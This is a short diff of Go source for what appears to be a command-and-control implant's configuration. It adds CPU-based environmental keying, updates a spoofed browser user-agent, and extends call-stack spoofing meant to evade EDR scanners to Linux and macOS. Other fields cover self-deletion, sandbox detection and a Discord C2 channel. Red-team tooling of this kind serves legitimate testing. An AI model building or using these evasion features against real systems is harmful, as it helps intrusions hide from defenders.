@@ -9,7 +9,7 @@ var (
 	payloadUUID    string = ""
 	callbackHost   string = ""
 	callbackPort   string = "443"
-	userAgent      string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
+	userAgent      string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36"
 	userAgentPool  string = "" // Newline-separated pool of User-Agent strings for rotation
 	sleepInterval  string = "10"
 	jitter         string = "10"
@@ -40,6 +40,7 @@ var (
 	envKeyDomain           string = "" // Environment key: domain must match this regex
 	envKeyUsername         string = "" // Environment key: username must match this regex
 	envKeyProcess          string = "" // Environment key: this process must be running
+	envKeyCpuid            string = "" // Environment key: CPU brand string must match this regex
 	envKeyDerive           string = "" // Environmental keying method: hostname, domain, username, hostname+domain, hostname+domain+username
 	envDerivedBlob         string = "" // Base64 AES-GCM encrypted config blob (keyed to host environment)
 	selfDelete             string = "" // Self-delete binary from disk after execution starts
@@ -51,8 +52,8 @@ var (
 	xorKey                 string = "" // Base64 XOR key for C2 string deobfuscation (empty = plaintext)
 	sandboxGuard           string = "" // Detect sleep skipping (sandbox fast-forward) and exit silently
 	sleepMask              string = "" // Encrypt sensitive agent/C2 data in memory during sleep cycles
-	sleepGuardPages        string = "" // VirtualProtect PAGE_NOACCESS on vault pages during sleep (Windows only)
-	stackSpoof             string = "" // Spoof call stack during sleep to evade EDR thread scanners (Windows only)
+	sleepGuardPages        string = "" // PROT_NONE / PAGE_NOACCESS on vault pages during sleep
+	stackSpoof             string = "" // Spoof call stack during sleep to evade EDR thread scanners (Windows, Linux amd64, macOS arm64)
 	jitterProfile          string = "" // Adaptive jitter profile: uniform, normal, exponential (empty = uniform)
 	discordBotToken        string = "" // Discord bot token for Discord C2 profile
 	discordChannelID       string = "" // Discord channel ID for Discord C2 profile
@@ -128,6 +129,7 @@ func clearGlobals() {
 	envKeyDomain = ""
 	envKeyUsername = ""
 	envKeyProcess = ""
+	envKeyCpuid = ""
 	envKeyDerive = ""
 	envDerivedBlob = ""
 
